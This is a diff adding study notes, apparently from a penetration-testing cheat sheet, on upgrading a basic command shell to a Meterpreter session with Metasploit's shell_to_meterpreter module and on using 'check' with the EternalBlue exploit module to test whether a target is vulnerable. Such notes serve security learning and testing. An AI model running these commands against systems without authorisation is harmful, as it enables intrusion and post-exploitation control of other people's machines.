@@ -241,3 +241,61 @@ msf6 > run
 
 ---
 ---
+# Upgrading Shell to Meterpreter
+
+## Current Session
+
+- Type: `shell cmd/unix` (basic command shell)
+
+## Upgrade Process
+
+```msf
+search shell_to_meterpreter
+use post/multi/manage/shell_to_meterpreter
+set SESSION 1
+run
+```
+
+✅ Result:  
+New session opened → `meterpreter x86/linux`
+
+> 💡 **Requirement**: Active shell session + target architecture compatibility  
+> ⚠️ Fails if target lacks required libraries or payload can't execute in memory
+
+---
+---
+# Using `check` in Metasploit – Vulnerability Verification
+
+## How to Use `check`
+
+After selecting an exploit:
+```msf
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.10
+check
+```
+✅ Output:  
+- `[+] 192.168.1.10:445 - The target is vulnerable.`  
+- `[-] 192.168.1.10:445 - The target is not vulnerable.`
+
+> 💡 **Purpose**: Verifies exploit conditions **without launching the payload**
+
+---
+## Do You Need `db_nmap`?
+
+**No — `check` works independently of the database.**
+
+### Requirements for `check`:
+1. **Target IP/port reachable** (via standard network scan)
+2. **Exploit module supports `check`** (not all do)
+3. **Correct `RHOSTS`/`RPORT` set**
+
+---
+## Critical Notes
+
+- **Not all exploits support `check`** (e.g., client-side exploits)
+- **False positives/negatives possible** (e.g., patched but version unchanged)
+- **Always verify manually** if `check` is unreliable
+
+---
+---
